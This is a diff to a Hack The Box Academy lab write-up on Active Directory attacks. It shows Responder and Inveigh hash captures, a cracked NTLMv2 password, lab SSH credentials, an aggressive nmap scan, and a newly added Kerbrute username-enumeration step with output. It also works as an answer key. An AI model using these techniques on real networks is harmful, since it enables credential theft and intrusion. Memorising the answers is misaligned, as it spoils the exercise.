@@ -51,9 +51,9 @@ We provided the above scoping documentation so we become used to seeing this sty
 The Stage Is Set
 Now that we have our scope clearly defined for this module, we can dive into exploring Active Directory enumeration and attack vectors. Now, let's dive into performing passive external enumeration against Inlanefreight.
 
-## Questions and Answers
+# Questions and Answers
 
-### External Recon and Enumeration Principles
+## External Recon and Enumeration Principles
 
 * **While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{******} )**
 For this task, I took advanted of the BGP Toolkit by Hurricane Electric. In the search bar, I entered the target domain: *inlanefreight.com*
@@ -62,9 +62,10 @@ Once the domain page loaded, I browsed to the DNS Records section. Under the TXT
 
 [![Screenshot-2025-03-13-090412.png](https://i.postimg.cc/X71P62Vw/Screenshot-2025-03-13-090412.png)](https://postimg.cc/LnfDz3gX)
 
-### Initial Enumeration of the Domain
+## Initial Enumeration of the Domain
 
 * **From your scans, what is the "commonName" of host 172.16.5.5 ?**
+
 For this task, I performed a detailed network scan against the targets that we discovered earlier to identify open ports and extract the host information. I used Nmap with aggressive scanning enabled to perform service detection, OS fingerprinting, script scanning, and version detection:
 
 ```c
@@ -114,7 +115,7 @@ PORT      STATE SERVICE       VERSION
 ```
 
 
-### LLMNR/NBT-NS Poisoning - from Linux
+## LLMNR/NBT-NS Poisoning - from Linux
 
 * **Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.**
 
@@ -160,7 +161,7 @@ WLEY::INLANEFREIGHT:6c0dde4851063a3b:9e405760f4fca4e917989d53b08cfdf8:0101000000
 [![Screenshot-2025-03-13-143007.png](https://i.postimg.cc/6qqgThvZ/Screenshot-2025-03-13-143007.png)](https://postimg.cc/gL9NT84c)
 
 
-### LLMNR/NBT-NS Poisoning - from Windows
+## LLMNR/NBT-NS Poisoning - from Windows
 
 * **Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.**
 
@@ -219,7 +220,7 @@ cat svc_cracked.txt
 SVC_QUALYS::INLANEFREIGHT:5cb2c5bc321a876a:4b659b343655147dada26c4e21ede70d:01010000000000006fe2f15cde94db019440b1162dc10e410000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008006fe2f15cde94db0106000400020000000800300030000000000000000000000000300000b3517a0e8ed7e6d67ea022f0b1f9c03843cd9b804d89be630d8a8fca650a8d2b0a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:security#1
 ```
 
-### Enumerating & Retrieving Password Policies
+## Enumerating & Retrieving Password Policies
 
 >*SSH to 10.129.67.132 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"*
 
@@ -327,4 +328,34 @@ domain_logoff_information:
 Completed after 5.35 seconds
 ```
   
+## Password Spraying - Making a Target User List
 
+> SSH to 10.129.67.220 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
+* **Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?**
+
+I started by connecting to the target machine at 10.129.167.132 via SSH, using the provided credentials. Once connected, I ran Kerbrute: 
+```c
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+```
+
+This gave me the following results: 
+```c
+<snip>
+2025/03/14 11:26:19 >  [+] VALID USERNAME:	 ngriffith@inlanefreight.local
+2025/03/14 11:26:19 >  [+] VALID USERNAME:	 sinman@inlanefreight.local
+2025/03/14 11:26:19 >  [+] VALID USERNAME:	 minman@inlanefreight.local
+2025/03/14 11:26:19 >  [+] VALID USERNAME:	 rhester@inlanefreight.local
+2025/03/14 11:26:19 >  [+] VALID USERNAME:	 rburrows@inlanefreight.local
+2025/03/14 11:26:20 >  [+] VALID USERNAME:	 dpalacios@inlanefreight.local
+2025/03/14 11:26:21 >  [+] VALID USERNAME:	 strent@inlanefreight.local
+2025/03/14 11:26:21 >  [+] VALID USERNAME:	 fanthony@inlanefreight.local
+2025/03/14 11:26:22 >  [+] VALID USERNAME:	 evalentin@inlanefreight.local
+2025/03/14 11:26:22 >  [+] VALID USERNAME:	 sgage@inlanefreight.local
+2025/03/14 11:26:22 >  [+] VALID USERNAME:	 jshay@inlanefreight.local
+2025/03/14 11:26:23 >  [+] VALID USERNAME:	 jhermann@inlanefreight.local
+2025/03/14 11:26:23 >  [+] VALID USERNAME:	 whouse@inlanefreight.local
+2025/03/14 11:26:24 >  [+] VALID USERNAME:	 emercer@inlanefreight.local
+2025/03/14 11:26:25 >  [+] VALID USERNAME:	 wshepherd@inlanefreight.local
+2025/03/14 11:26:25 >  Done! Tested 48705 usernames (56 valid) in 14.542 seconds
+```
